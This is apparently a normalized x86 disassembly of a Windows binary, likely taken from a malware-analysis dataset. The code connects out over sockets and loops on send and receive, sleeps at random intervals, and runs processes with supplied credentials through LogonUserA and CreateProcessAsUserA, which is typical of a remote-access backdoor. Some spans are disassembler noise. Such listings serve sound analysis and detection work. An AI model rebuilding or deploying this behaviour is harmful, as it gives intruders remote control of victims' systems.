[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
mov edi [ ebp - 0x2654 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x2658 ] ecx
jge r-xdata
jmp r-xdata
mov ecx [ ebp - 0x2650 ]
add ecx [ ebp - 0x23f0 ]
mov edx [ ebp - 0x2654 ]
add edx [ ebp - 0x23f0 ]
mov al [ edx ]
mov [ ecx ] al
jmp r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
cmp [ ebp - 0x4718 ] 0x103
je r-xdata
jle r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
inc ecx
xor eax eax
mov edi [ ebp - 0x26b8 ]
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff7
push ecx
push rw-data
mov eax [ ebp - 0x26b8 ]
push eax
call [ strncpy@IAT ]
add esp 0xc
cmp [ ebp - 0x3e8 ] 0x1
jne r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x2658 ]
add ecx 0x1
mov [ ebp - 0x265c ] ecx
jmp r-xdata
mov eax [ ebp - 0x2654 ]
add eax [ ebp - 0x2658 ]
movsx ecx [ eax ]
cmp ecx 0x2d
je r-xdata
jmp r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebp - 0x2500 ]
push eax
call [ CloseHandle@IAT ]
mov [ ebp - 0x2500 ] 0x0
jmp r-xdata
mov ecx 0x2
mov edi rw-data
jg r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push rw-data
push r-xdata
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebp - 0x26b8 ]
push eax
call sub_71005420
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edi rw-data
mov edx [ ebp - 0x26b8 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x2654 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x265c ] ecx
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x2658 ]
sub edx [ ebp - 0x23f0 ]
mov eax [ ebp - 0x2654 ]
add eax [ ebp - 0x2658 ]
mov ecx [ ebp - 0x26b0 ]
mov al [ eax ]
mov [ ecx + edx - 0x1 ] al
jmp r-xdata
mov ecx [ ebp - 0x23f0 ]
add ecx 0x1
mov [ ebp - 0x23f0 ] ecx
lea eax [ ebp - 0x250c ]
push eax
push 0x0
push rw-data
push sub_71005450
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
je r-xdata
call sub_710041ce
add [ edi + rw-data ] bh
mov edx rw-data
mov eax [ ebp - 0x26b8 ]
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
mov ecx [ ebp - 0x265c ]
add ecx 0x1
mov [ ebp - 0x26a4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x2654 ]
add eax [ ebp - 0x265c ]
movsx ecx [ eax ]
cmp ecx 0x2d
je r-xdata
jmp r-xdata
mov ecx 0xb
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov edx [ ebp - 0x26b8 ]
push edx
call [ free@IAT ]
add esp 0x4
mov [ ebp - 0x26b8 ] 0x0
mov [ rw-data ] 0x0
push 0x0
mov edx [ ebp - 0x28 ]
push edx
call [ TerminateThread@IAT ]
mov [ ebp - 0x28 ] 0x0
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov edi [ ebp - 0x2654 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x26a4 ] ecx
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x265c ]
sub edx [ ebp - 0x2658 ]
mov eax [ ebp - 0x2654 ]
add eax [ ebp - 0x265c ]
mov ecx [ ebp - 0x26a8 ]
mov al [ eax ]
mov [ ecx + edx - 0x1 ] al
jmp r-xdata
mov edx [ ebp - 0x2658 ]
add edx 0x1
mov [ ebp - 0x2658 ] edx
mov ecx 0x5
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov edx rw-data
mov eax [ ebp - 0x26a8 ]
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
mov eax [ ebp - 0x26a4 ]
sub eax [ ebp - 0x265c ]
mov ecx [ ebp - 0x2654 ]
add ecx [ ebp - 0x26a4 ]
mov edx [ ebp - 0x264c ]
mov cl [ ecx ]
mov [ edx + eax - 0x1 ] cl
jmp r-xdata
jmp r-xdata
mov ecx 0x4
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov ecx rw-data
mov edx [ ebp - 0x26b0 ]
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
xor edx edx
mov eax [ ebp - 0x26a8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0x26a4 ]
add edx 0x1
mov [ ebp - 0x26a4 ] edx
mov edx [ ebp - 0x265c ]
add edx 0x1
mov [ ebp - 0x265c ] edx
mov ecx 0x17
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov [ ebp - 0x26bc ] 0x0
xor eax eax
mov [ ebp - 0x26d0 ] eax
mov [ ebp - 0x26cc ] eax
mov [ ebp - 0x26c8 ] eax
mov [ ebp - 0x26c4 ] eax
mov [ ebp - 0x26c0 ] eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffe9
mov esi rw-data
lea edi [ ebp - 0x26d0 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ ebp - 0x26d0 ]
push eax
call [ _atoi64@IAT ]
add esp 0x4
mov [ rw-data ] eax
mov [ rw-data ] edx
lea eax [ ebp - 0x26b4 ]
push eax
push 0x0
push 0x2
mov ecx [ ebp - 0x26b0 ]
push ecx
mov edx [ ebp - 0x26a8 ]
push edx
mov eax [ ebp - 0x2650 ]
push eax
call [ LogonUserA@IAT ]
mov [ ebp - 0x26ac ] eax
mov ecx [ ebp - 0x2650 ]
push ecx
call [ free@IAT ]
add esp 0x4
mov edx [ ebp - 0x26b0 ]
push edx
call [ free@IAT ]
add esp 0x4
mov eax [ ebp - 0x26a8 ]
push eax
call [ free@IAT ]
add esp 0x4
mov ecx [ ebp - 0x2654 ]
push ecx
call [ free@IAT ]
add esp 0x4
mov [ ebp - 0x2650 ] 0x0
mov [ ebp - 0x26b0 ] 0x0
mov [ ebp - 0x26a8 ] 0x0
mov [ ebp - 0x2654 ] 0x0
cmp [ ebp - 0x26ac ] 0x0
jne r-xdata
xor ecx ecx
mov edx [ ebp - 0x26b0 ]
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] ecx
mov ecx 0x5
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0xffffffff
lea edx [ ebp - 0x2648 ]
push edx
lea eax [ ebp - 0x26a0 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264c ]
push ecx
push 0x0
mov edx [ ebp - 0x26b4 ]
push edx
call [ CreateProcessAsUserA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ ebp - 0x26d4 ] 0x0
xor ecx ecx
mov [ ebp - 0x26e8 ] ecx
mov [ ebp - 0x26e4 ] ecx
mov [ ebp - 0x26e0 ] ecx
mov [ ebp - 0x26dc ] ecx
mov [ ebp - 0x26d8 ] ecx
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffe5
mov esi rw-data
lea edi [ ebp - 0x26e8 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ ebp - 0x26e8 ]
push eax
call [ _atoi64@IAT ]
add esp 0x4
mov [ rw-data ] eax
mov [ rw-data ] edx
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
nop
nop
nop
mov ecx 0x5
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
jne r-xdata
mov edx rw-data
mov eax rw-data
mov cx [ eax ]
cmp cx [ edx ]
jne r-xdata
lea ecx [ ebp - 0x250c ]
push ecx
push 0x0
push rw-data
push sub_71007010
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
jmp r-xdata
nop
clc
jae r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push rw-data
push sub_71005e80
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
jne r-xdata
cmp dx [ eax ]
jne r-xdata
mov eax rw-data
mov ecx rw-data
mov dx [ ecx ]
call 0x15d0fa4f
add [ ecx - 0x47 ] dh
insb
das
sub_710042bf
jno r-xdata
add [ ecx + 0x50 ] dh
insb
das
add [ ecx + 0x33 ] esi
shl bl cl
cmpsb [ esi ] [ edi ]
mov [ ebp - 0x238 ] rw-data
mov [ ebp - 0x14 ] rw-data
push 0x0
push 0x1
push 0x2
call socket
mov [ rw-data ] eax
cmp [ rw-data ] 0xffffffff
jne r-xdata
clc
jae r-xdata
lea ecx [ ebp - 0x46f4 ]
call sub_710017f0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x46f4 ]
call sub_71001a80
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
lea ecx [ ebp - 0x46f4 ]
call sub_71001890
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx 0x800
xor eax eax
lea edi [ ebp - 0x46e8 ]
[ edi ]
mov ecx [ rw-data ]
mov esi rw-data
lea edi [ ebp - 0x46e8 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ rw-data ]
mov [ ebp - 0x46ec ] eax
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov ecx [ rw-data ]
push ecx
push rw-data
push rw-data
call [ sprintf@IAT ]
add esp 0xc
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
push 0x0
mov edx [ rw-data ]
push edx
push rw-data
mov eax [ rw-data ]
push eax
call send
cmp eax 0x1
jge r-xdata
mov ecx [ ebp - 0x14 ]
push ecx
call [ atol@IAT ]
add esp 0x4
push eax
call htons
mov [ ebp - 0x3e2 ] ax
mov [ ebp - 0x3e4 ] 0x2
mov edx [ ebp - 0x238 ]
push edx
call inet_addr
mov [ ebp - 0x3e0 ] eax
push 0x10
lea eax [ ebp - 0x3e4 ]
push eax
mov ecx [ rw-data ]
push ecx
call connect
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
call 0x7103ff35
add [ eax ] al
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
push 0x0
push 0x2000
push rw-data
mov eax [ rw-data ]
push eax
call recv
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jge r-xdata
push 0x0
mov ecx [ rw-data ]
push ecx
call shutdown
mov edx [ rw-data ]
push edx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x46f4 ]
call sub_71001800
jmp r-xdata
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
push 0x80
lea eax [ ebp - 0x25d0 ]
push eax
call gethostname
test eax eax
jne r-xdata
push 0x0
call [ time@IAT ]
add esp 0x4
push eax
call [ srand@IAT ]
add esp 0x4
call [ rand@IAT ]
cdq
mov ecx 0x28
idiv ecx
imul edx edx 0xea60
push edx
call [ Sleep@IAT ]
push rw-data
call gethostbyname
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov ecx 0x80
xor eax eax
lea edi [ ebp - 0x228 ]
[ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffb
mov esi rw-data
lea edi [ ebp - 0x228 ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp [ ebp - 0x3e8 ] 0x1
jne r-xdata
mov eax [ rw-data ]
push eax
push rw-data
call sub_71001fe0
add esp 0x8
mov ecx 0x5
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
push 0x0
mov ecx [ rw-data ]
push ecx
call shutdown
mov edx [ rw-data ]
push edx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x46f4 ]
call sub_71001800
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
push rw-data
mov ecx [ rw-data ]
push ecx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
lea edi [ ebp - 0x25d0 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ ebp - 0x25d0 ]
push eax
call gethostbyname
mov [ ebp - 0x254c ] eax
mov [ ebp - 0x23f0 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ edx + 0xc ]
mov ecx [ eax ]
mov edx [ ecx ]
push edx
call inet_ntoa
mov [ ebp - 0x24 ] eax
mov ecx 0xc
xor eax eax
mov edi rw-data
[ edi ]
stosw [ edi ]
mov edi [ ebp - 0x24 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
push 0x927c0
call [ Sleep@IAT ]
call WSACleanup
jmp r-xdata
je r-xdata
mov [ ebp - 0x4708 ] 0x0
cmp [ ebp - 0x2504 ] 0x0
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x4700 ]
call sub_710017f0
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x4700 ]
call sub_71001a80
lea ecx [ ebp - 0x228 ]
push ecx
call [ atoi@IAT ]
add esp 0x4
mov [ ebp - 0x46f8 ] eax
cmp [ ebp - 0x46f8 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x46f4 ]
call sub_71001800
jmp r-xdata
mov eax [ ebp - 0x46ec ]
push eax
lea ecx [ ebp - 0x46e8 ]
push ecx
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
push 0x0
push 0x2000
push rw-data
mov eax [ rw-data ]
push eax
call recv
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jge r-xdata
mov [ ebp - 0x24f4 ] 0x0
push 0x0
mov edx [ rw-data ]
push edx
call shutdown
mov eax [ rw-data ]
push eax
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
cmp [ ebp - 0x254c ] 0x0
je r-xdata
lea edx [ ebp - 0x3c8 ]
push edx
push 0x101
call WSAStartup
mov [ ebp - 0x22c ] eax
cmp [ ebp - 0x22c ] 0x0
je r-xdata
mov eax rw-data
mov ecx rw-data
mov dx [ ecx ]
cmp dx [ eax ]
jne r-xdata
jne r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push rw-data
push sub_71004bd0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x2504 ] eax
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea eax [ ebp - 0x4708 ]
push eax
mov ecx [ ebp - 0x2504 ]
push ecx
call [ GetExitCodeThread@IAT ]
mov [ ebp - 0x4704 ] eax
cmp [ ebp - 0x4704 ] 0x0
je r-xdata
mov eax [ ebp - 0x46f8 ]
push eax
lea ecx [ ebp - 0x4700 ]
call sub_71001cb0
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
lea edx [ ebp - 0x228 ]
push edx
lea ecx [ ebp - 0x4700 ]
call sub_71001de0
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x46f4 ]
call sub_71001800
jmp r-xdata
mov eax [ rw-data ]
push eax
push rw-data
call sub_71001fe0
add esp 0x8
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov ecx rw-data
mov edx rw-data
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
push 0x0
mov ecx [ rw-data ]
push ecx
call shutdown
mov edx [ rw-data ]
push edx
call closesocket
push 0xea60
call [ Sleep@IAT ]
jmp r-xdata
xor ecx ecx
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x24f4 ]
mov edx [ rw-data ]
mov [ ebp + ecx * 4 - 0x24f0 ] edx
mov eax [ ebp - 0x24f4 ]
add eax 0x1
mov [ ebp - 0x24f4 ] eax
mov edx [ ebp - 0x254c ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0x23f0 ]
cmp [ eax + ecx * 4 ] 0x0
je r-xdata
call sub_71004b30
mov [ ebp - 0x3e8 ] eax
cmp [ ebp - 0x3e8 ] 0x0
jne r-xdata
push 0x1b7740
call [ Sleep@IAT ]
jmp r-xdata
je r-xdata
mov [ ebp - 0x4710 ] 0x0
cmp [ ebp - 0x23ec ] 0x0
je r-xdata
jmp r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
cmp [ ebp - 0x4708 ] 0x103
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
mov [ ebp - 0x28 ] 0x0
mov ecx 0x13
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
je r-xdata
cmp [ ebp - 0x3e8 ] 0x1
jne r-xdata
cmp [ ebp - 0x24f4 ] 0x40
jae r-xdata
lea edx [ ebp - 0x234 ]
push edx
push 0x0
push 0x0
lea eax [ ebp - 0x24f4 ]
push eax
push 0x0
call select
test eax eax
jne r-xdata
mov edx [ ebp - 0x254c ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0x23f0 ]
mov edx [ eax + ecx * 4 ]
mov eax [ edx ]
push eax
call inet_ntoa
mov [ ebp - 0x2550 ] eax
mov edi [ ebp - 0x2550 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
cmp [ ebp - 0x3e8 ] 0x1
jne r-xdata
jmp r-xdata
mov ecx 0x5
mov edi rw-data
jne r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push rw-data
push sub_710064d0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x23ec ] eax
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea eax [ ebp - 0x4710 ]
push eax
mov ecx [ ebp - 0x23ec ]
push ecx
call [ GetExitCodeThread@IAT ]
mov [ ebp - 0x470c ] eax
